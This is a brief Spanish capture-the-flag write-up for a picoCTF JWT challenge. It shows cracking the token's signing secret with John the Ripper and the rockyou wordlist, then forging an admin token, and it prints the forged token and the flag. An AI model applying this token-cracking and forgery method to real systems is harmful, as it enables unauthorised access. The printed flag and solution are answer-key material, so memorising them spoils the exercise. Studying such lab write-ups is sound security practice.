## Descripción 
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210

Hint:
1. What is that cookie?
2. Have you heard of JWT?
## Solución 1

Primero vamos a logearnos en la página con admin, nos dice que no se puede y lo hacemos con cualquier otro, en cookies tenemos el jwt y lo pasamos a un decoder de jwt le cambiamos por admin el user y de todas formas sale que no tenemos acceso.

Usando la consola vamos a usar un ataque de diccionario para obtener el secret de ese jwt

```
jwt = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoib21hcnsifQ.5Bm3MkeadgsPTFN1yl8NPdkXOeMfrPORrQQgKZBZtyw

Usamos este comando para usar el ataque de diccionario en el jwt que tenemos
john hash -w-/usr/share/wordlists/rockyou.txt

ilovepico

jwt+ilovepico = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s


flag: picoCTF{jawt_was_just_what_you_thought_44c752f5}

```

## Referencias
https://en.wikipedia.org/wiki/JSON
https://en.wikipedia.org/wiki/JSON_Web_Token
https://jwt.io/
